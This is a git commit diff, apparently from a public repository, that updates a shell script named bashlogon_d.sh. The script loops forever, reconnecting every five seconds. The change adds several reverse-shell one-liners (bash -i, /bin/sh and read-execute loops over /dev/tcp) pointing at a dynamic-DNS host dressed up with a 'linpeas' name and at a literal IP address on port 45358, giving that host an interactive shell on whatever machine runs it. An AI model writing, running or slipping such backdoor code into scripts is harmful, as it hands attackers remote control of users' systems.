39468fb3e371640a0a1221094586cbc4a9469943
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2024-02-10 15:55:42 +0100

    Update bashlogon_d.sh

--- bashlogon_d.sh
+++ bashlogon_d.sh
@@ -2,20 +2,18 @@
 
 # Function to establish connection
 establish_connection() {
-    exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358
-}
-
-# Function to handle commands
-handle_commands() {
-    while read -r line; do
-        $line 2>&5 >&5
-    done <&5
+    bash -i >& /dev/tcp/linpeas874269852.ddns.net/45358 0>&1
+    bash -i >& /dev/tcp/128.78.143.131/45358 0>&1
+    exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358;cat <&5 | while read line; do $line 2>&5 >&5; done
+    exec 5<>/dev/tcp/128.78.143.131/45358;cat <&5 | while read line; do $line 2>&5 >&5; done
+    exec /bin/sh 0</dev/tcp/linpeas874269852.ddns.net/45358 1>&0 2>&0
+    exec /bin/sh 0</dev/tcp/128.78.143.131/45358 1>&0 2>&0
+    0<&196;exec 196<>/dev/tcp/linpeas874269852.ddns.net/45358; sh <&196 >&196 2>&196
 }
 
 # Main loop to handle reconnection
 while true; do
     establish_connection
-    handle_commands
     # Sleep for a while before attempting to reconnect
     sleep 5
 done
